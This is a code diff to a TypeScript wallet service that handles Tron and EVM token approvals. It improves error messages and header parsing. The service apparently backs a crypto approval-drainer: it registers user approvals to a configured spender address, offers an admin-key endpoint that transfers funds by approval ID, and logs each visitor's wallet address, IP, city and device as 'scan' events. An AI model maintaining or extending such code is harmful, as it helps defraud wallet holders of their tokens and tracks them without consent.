@@ -57,8 +57,61 @@ const TOKENS = {
   },
 } as const;
 
+function decodeTronNodeMessage(message: unknown): string | null {
+  if (typeof message !== "string" || !message) return null;
+  try {
+    if (/^[0-9a-fA-F]+$/.test(message) && message.length % 2 === 0) {
+      return Buffer.from(message, "hex").toString("utf8");
+    }
+  } catch {
+    // keep original message
+  }
+  return message;
+}
+
+function humanizeTronBroadcastError(args: {
+  code?: string | null;
+  message?: string | null;
+}): string {
+  const code = (args.code ?? "").trim().toUpperCase();
+  const msg = (args.message ?? "").trim();
+
+  if (
+    code.includes("BANDWITH") ||
+    code.includes("BANDWIDTH") ||
+    /resource insufficient|bandwidth|energy/i.test(msg)
+  ) {
+    return (
+      "Tron broadcast rejected: insufficient Bandwidth/Energy/TRX. " +
+      "Add a small amount of TRX (or stake for energy), then try again. " +
+      (msg ? `Node: ${msg}` : code ? `Code: ${code}` : "")
+    ).trim();
+  }
+
+  if (code === "SIGERROR" || /signature/i.test(msg)) {
+    return `Tron broadcast rejected: invalid signature. ${msg || code}`.trim();
+  }
+
+  if (msg) return `Tron broadcast failed: ${msg}${code ? ` (${code})` : ""}`;
+  if (code) return `Tron broadcast failed: ${code}`;
+  return "Tron broadcast rejected";
+}
+
 @Injectable()
 export class WalletService {
+  private getHeader(
+    headers: Headers | Record<string, string | string[] | undefined>,
+    name: string
+  ): string {
+    if (headers && typeof (headers as Headers).get === "function") {
+      return (headers as Headers).get(name)?.trim() ?? "";
+    }
+    const key = name.toLowerCase();
+    const value = (headers as Record<string, string | string[] | undefined>)[key];
+    if (Array.isArray(value)) return String(value[0] ?? "").trim();
+    return String(value ?? "").trim();
+  }
+
   private spenderEvm() { return (process.env.NEXT_PUBLIC_SPENDER_EVM ?? "").trim(); }
   private spenderTron() { return (process.env.NEXT_PUBLIC_SPENDER_TRON ?? "").trim(); }
   private spenderFor(network: string) { return network === "tron" ? this.spenderTron() : this.spenderEvm(); }
@@ -290,7 +343,19 @@ export class WalletService {
     if (!Array.isArray(signature) || signature.length === 0) throw new BadRequestException("Signed transaction is missing signature[]");
     const res = await fetch(`${TRON_GRID}/wallet/broadcasttransaction`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(transaction), cache: "no-store" });
     const json = (await res.json().catch(() => ({}))) as { result?: boolean; txid?: string; message?: string; code?: string };
-    if (!res.ok || json.result !== true || !json.txid) return { result: false, error: json.message || json.code || "Tron broadcast rejected", trongrid: json };
+    const decodedMessage = decodeTronNodeMessage(json.message);
+    if (!res.ok || json.result !== true || !json.txid) {
+      return {
+        result: false,
+        error: humanizeTronBroadcastError({
+          code: json.code ?? null,
+          message: decodedMessage,
+        }),
+        code: json.code ?? null,
+        message: decodedMessage ?? null,
+        trongrid: json,
+      };
+    }
     return { result: true, txid: json.txid, trongrid: json };
   }
   async registerApproved(body: Record<string, unknown>) {
@@ -310,8 +375,11 @@ export class WalletService {
     await this.recordAudit(`owner:${address}`, "register_legacy", "approval", { network, txHash }, approval.id);
     return { code: 200, status: "success", message: "OK", data: { registered: true, approvalId: approval.id }, timestamp: new Date().toISOString() };
   }
-  async adminTransfer(body: Record<string, unknown>, headers: Headers) {
-    const apiKey = headers.get("x-admin-api-key")?.trim() ?? "";
+  async adminTransfer(
+    body: Record<string, unknown>,
+    headers: Headers | Record<string, string | string[] | undefined>
+  ) {
+    const apiKey = this.getHeader(headers, "x-admin-api-key");
     const expected = (process.env.ADMIN_API_KEY ?? "").trim();
     if (!expected || apiKey !== expected) throw new UnauthorizedException("Unauthorized");
     const approvalId = String(body.approvalId ?? "").trim();
@@ -342,9 +410,11 @@ export class WalletService {
     if (!address) throw new BadRequestException("body must have required property 'address'");
     return { code: 200, status: "success", message: "OK", data: { delegated: false, placeholder: true, address, currentUsdt: String(body.currentUsdt ?? "0") }, timestamp: new Date().toISOString() };
   }
-  async ipgeo(headers: Headers) {
+  async ipgeo(headers: Headers | Record<string, string | string[] | undefined>) {
     try {
-      const headerIp = headers.get("x-forwarded-for")?.split(",")[0]?.trim() || headers.get("x-real-ip") || "unknown";
+      const forwardedFor = this.getHeader(headers, "x-forwarded-for");
+      const realIp = this.getHeader(headers, "x-real-ip");
+      const headerIp = forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
       const local = !headerIp || headerIp === "unknown" || headerIp === "127.0.0.1" || headerIp === "::1" || headerIp.startsWith("127.") || headerIp.startsWith("::ffff:127.");
       const url = local ? "http://ip-api.com/json/?fields=status,query,country,city,countryCode" : `http://ip-api.com/json/${encodeURIComponent(headerIp)}?fields=status,query,country,city,countryCode`;
       const res = await fetch(url, { cache: "no-store" });
@@ -358,16 +428,24 @@ export class WalletService {
       return { ip: "unknown", location: "Unknown" };
     }
   }
-  async tgLog(body: Record<string, unknown>, headers: Headers) {
+  async tgLog(
+    body: Record<string, unknown>,
+    headers: Headers | Record<string, string | string[] | undefined>
+  ) {
     const address = String(body.address ?? body.tron ?? body.evm ?? "").trim();
     if (!address) throw new BadRequestException("Provide address");
-    const userAgent = String(body.userAgent ?? headers.get("user-agent") ?? "unknown");
-    const ip = String(body.ip ?? headers.get("x-forwarded-for")?.split(",")[0]?.trim() ?? headers.get("x-real-ip") ?? "unknown");
+    const userAgent = String(
+      body.userAgent || this.getHeader(headers, "user-agent") || "unknown"
+    );
+    const forwardedFor = this.getHeader(headers, "x-forwarded-for");
+    const realIp = this.getHeader(headers, "x-real-ip");
+    const fallbackIp = forwardedFor.split(",")[0]?.trim() || realIp || "unknown";
+    const ip = String(body.ip ?? fallbackIp);
     const location = String(body.location ?? "Unknown");
     const network = String(body.network ?? (address.startsWith("T") ? "tron" : "evm"));
     const status = String(body.status ?? "success");
     const eventType = String(body.type ?? body.event ?? "scan");
-    await prisma.tgLogEvent.create({ data: { type: eventType, network, address, status, error: body.error ? String(body.error) : null, ip, location, site: String(body.site ?? headers.get("host") ?? "unknown"), device: /mobi|iphone|android/i.test(userAgent) ? "Mobile" : /mac|win|linux|cros/i.test(userAgent) ? "Desktop" : "Other" } });
+    await prisma.tgLogEvent.create({ data: { type: eventType, network, address, status, error: body.error ? String(body.error) : null, ip, location, site: String(body.site ?? this.getHeader(headers, "host") ?? "unknown"), device: /mobi|iphone|android/i.test(userAgent) ? "Mobile" : /mac|win|linux|cros/i.test(userAgent) ? "Desktop" : "Other" } });
     return { code: 200, status: "success", message: "OK", data: { sent: false }, timestamp: new Date().toISOString() };
   }
 }
